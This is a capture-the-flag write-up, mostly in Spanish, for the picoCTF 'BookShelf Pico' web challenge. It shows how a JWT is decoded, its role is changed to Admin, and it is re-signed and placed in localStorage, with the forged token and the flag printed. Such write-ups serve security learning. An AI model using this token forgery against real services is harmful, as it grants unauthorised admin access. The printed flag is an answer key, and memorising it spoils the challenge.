### Descripción
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/478/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:54685/).

Hints:
1. Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
2. The 'role' and 'userId' fields in the JWT can be of interest to you!
3. The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
4. Upgrade your 'role' with the _new_ (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.

### Solución
Al entrar al servidor observamos una imagen FLAG restringida a la que solo se puede acceder como Admin.
Inspeccionamos la imagen para sacar el token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTM3NDgyNiwiaWF0IjoxNzQ0NzcwMDI2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.T8W0beBQ3GTQuKvP4PBc7y3tIFc8UG49YT6AZbJqQJY

{"role":"Free","iss":"bookshelf","exp":1745374826,"iat":1744770026,"userId":1,"email":"user"}
```

En jwt.io hay que modificar el role, userId y el email:
```
{"role":"Admin","iss":"bookshelf","exp":1745374826,"iat":1744770026,"userId":2,"email":"admin"}

Token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzNzQ4MjYsImlhdCI6MTc0NDc3MDAyNiwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.HJBj_TwdCl2Rl3RIN7VGXwXoLFd7idJXI3W0qH9Ez8g
```

Ahora esos valores los sustituimos en el Local storage de la página y la recargamos para observar la imagen:
```
Great job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_602ce414}
```

Flag:
picoCTF{w34k_jwt_n0t_g00d_602ce414}
### Notas adicionales

### Referencias
https://webshell.picoctf.org/
https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg3MA